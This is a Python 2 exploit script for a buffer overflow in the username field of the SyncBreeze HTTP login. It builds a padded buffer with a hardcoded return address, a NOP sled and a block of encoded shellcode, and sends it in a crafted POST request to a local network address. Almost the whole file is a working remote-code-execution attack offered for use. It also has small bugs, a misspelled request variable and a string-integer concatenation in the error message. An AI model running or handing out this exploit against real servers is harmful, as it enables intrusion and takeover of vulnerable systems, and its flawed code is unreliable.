import socket
import time

"""

	Exploit of SyncBreeze HTTP POST method username overflow

"""


#\x00\x0a\x0d\x25\x26\x2b\x3d
# jmp address: 100931AF


shell=""
shell+="\xb8\x86\x51\x86\x95\xd9\xf6\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
shell+="\x52\x83\xeb\xfc\x31\x43\x0e\x03\xc5\x5f\x64\x60\x35\xb7\xea"
shell+="\x8b\xc5\x48\x8b\x02\x20\x79\x8b\x71\x21\x2a\x3b\xf1\x67\xc7"
shell+="\xb0\x57\x93\x5c\xb4\x7f\x94\xd5\x73\xa6\x9b\xe6\x28\x9a\xba"
shell+="\x64\x33\xcf\x1c\x54\xfc\x02\x5d\x91\xe1\xef\x0f\x4a\x6d\x5d"
shell+="\xbf\xff\x3b\x5e\x34\xb3\xaa\xe6\xa9\x04\xcc\xc7\x7c\x1e\x97"
shell+="\xc7\x7f\xf3\xa3\x41\x67\x10\x89\x18\x1c\xe2\x65\x9b\xf4\x3a"
shell+="\x85\x30\x39\xf3\x74\x48\x7e\x34\x67\x3f\x76\x46\x1a\x38\x4d"
shell+="\x34\xc0\xcd\x55\x9e\x83\x76\xb1\x1e\x47\xe0\x32\x2c\x2c\x66"
shell+="\x1c\x31\xb3\xab\x17\x4d\x38\x4a\xf7\xc7\x7a\x69\xd3\x8c\xd9"
shell+="\x10\x42\x69\x8f\x2d\x94\xd2\x70\x88\xdf\xff\x65\xa1\x82\x97"
shell+="\x4a\x88\x3c\x68\xc5\x9b\x4f\x5a\x4a\x30\xc7\xd6\x03\x9e\x10"
shell+="\x18\x3e\x66\x8e\xe7\xc1\x97\x87\x23\x95\xc7\xbf\x82\x96\x83"
shell+="\x3f\x2a\x43\x03\x6f\x84\x3c\xe4\xdf\x64\xed\x8c\x35\x6b\xd2"
shell+="\xad\x36\xa1\x7b\x47\xcd\x22\x44\x30\xe6\x3b\x2c\x43\xf8\x3a"
shell+="\x16\xca\x1e\x56\x78\x9b\x89\xcf\xe1\x86\x41\x71\xed\x1c\x2c"
shell+="\xb1\x65\x93\xd1\x7c\x8e\xde\xc1\xe9\x7e\x95\xbb\xbc\x81\x03"
shell+="\xd3\x23\x13\xc8\x23\x2d\x08\x47\x74\x7a\xfe\x9e\x10\x96\x59"
shell+="\x09\x06\x6b\x3f\x72\x82\xb0\xfc\x7d\x0b\x34\xb8\x59\x1b\x80"
shell+="\x41\xe6\x4f\x5c\x14\xb0\x39\x1a\xce\x72\x93\xf4\xbd\xdc\x73"
shell+="\x80\x8d\xde\x05\x8d\xdb\xa8\xe9\x3c\xb2\xec\x16\xf0\x52\xf9"
shell+="\x6f\xec\xc2\x06\xba\xb4\xf3\x4c\xe6\x9d\x9b\x08\x73\x9c\xc1"
shell+="\xaa\xae\xe3\xff\x28\x5a\x9c\xfb\x31\x2f\x99\x40\xf6\xdc\xd3"
shell+="\xd9\x93\xe2\x40\xd9\xb1"

buffer = 'A'*780 + '\xAF\x31\x09\x10' + "\x90"*20 + shell + "\x90"*(1500-22-len(shell))

payload="username=" + buffer + "&password=dznhy"
http_requestt=""
http_request+="POST /login HTTP/1.1\r\n"
http_request+="Host: 192.168.43.50\r\n"
http_request+="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
http_request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
http_request+="Accept-Language: en-US,en;q=0.5\r\n"
http_request+="Accept-Encoding: gzip, deflate\r\n"
http_request+="Referer: http://192.168.43.50/login\r\n"
http_request+="Content-Type: application/x-www-form-urlencoded\r\n"
http_request+="Content-Length: " + str(len(payload)) + "\r\n"
http_request+="Origin: http://192.168.43.50\r\n"
http_request+="Connection: close\r\n"
http_request+="Upgrade-Insecure-Requests: 1\r\n"
http_request+="Cache-Control: max-age=0\r\n"
http_request+="\r\n"
http_request+=payload
print http_request

ip = "192.168.43.50"
port = 80

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))
	s.send(http_request)
	print s.recv(1024)
	s.close()
except:
	msg = "[-] could not connect to " + ip + " " + port
	print msg
